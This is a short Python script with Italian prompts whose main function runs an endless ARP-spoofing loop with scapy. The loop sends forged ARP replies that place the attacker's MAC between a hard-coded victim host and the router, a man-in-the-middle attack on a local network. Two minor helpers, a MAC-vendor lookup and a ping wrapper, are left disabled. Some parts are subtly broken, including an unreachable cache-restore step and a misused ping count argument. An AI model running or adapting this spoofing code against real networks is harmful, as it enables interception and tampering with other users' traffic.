from scapy.all import *
import re, uuid

import requests,subprocess
 
mymac=(':'.join(re.findall('..', '%012x' % uuid.getnode())))

def ARP_Spoof():

    while True:
        ether_pkt="ff:ff:ff:ff:ff:ff"
        risposta_arp_vittima= ARP(op=2, psrc="192.168.1.1",hwsrc=mymac,hwdst=ether_pkt,pdst="192.168.1.125")
        risposta_arp_router= ARP(op=2, psrc="192.168.1.125",hwsrc=mymac,hwdst=ether_pkt,pdst="192.168.1.1")
        try:
            sendp(Ether(dst=ether_pkt) / risposta_arp_vittima,verbose=False)
            sendp(Ether(dst=ether_pkt) / risposta_arp_router,verbose=False)
            time.sleep(2)
        except KeyboardInterrupt:
            exit()

    arp_reset= ARP(op=2, psrc="192.168.1.1",hwsrc=ether_pkt,hwdst=ether_pkt,pdst="192.168.1.125")
    sendp(Ether(dst=ether_pkt) / arp_reset,verbose=False)
    print("CleanExit Done")

def MAClookupAPI():
    ingresso=input("Inserisci MAC (Se enter uso mymac): ")
    try:
        if ingresso=="":
            response = requests.get('https://api.macvendors.com/'+mymac)
            print(response.text)

        else:
            response = requests.get('https://api.macvendors.com/'+ingresso)
            print(response.text)
    except Exception as e:
        print("Errore sulla GET: "+e)

def Ping():
    response = input("Inserire IP o Dominio: ")
    count= input("Quanto Pingare(Enter=default): ")

    try:
        if count=="":
            print(subprocess.run(["ping", "-c",response],text=True, capture_output=True).stdout)
        else:
            print(subprocess.run(["ping", "-c",count,response],text=True, capture_output=True).stdout)
    except FileNotFoundError:
        print("ping is not installed")
    except Exception as e:
        print("Error "+e)


if __name__=="__main__":
    ARP_Spoof()
    print("#############")
    #MAClookupAPI()
    print("#############")
    #Ping()